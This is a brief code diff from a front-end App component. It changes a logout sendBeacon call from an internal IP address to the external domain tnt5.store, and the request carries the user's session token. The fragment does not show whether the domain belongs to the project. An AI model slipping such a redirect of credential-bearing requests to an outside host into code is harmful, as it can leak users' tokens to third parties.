@@ -16,7 +16,7 @@ function App() {
       if (!token) return;
 
       const blob = new Blob([JSON.stringify({ token })], { type: "text/plain" });
-      navigator.sendBeacon("http://10.5.5.20/manage/logout/beacon", blob);
+      navigator.sendBeacon("https://tnt5.store/manage/logout/beacon", blob);
       console.log("sendBeacon sent");
     };
 
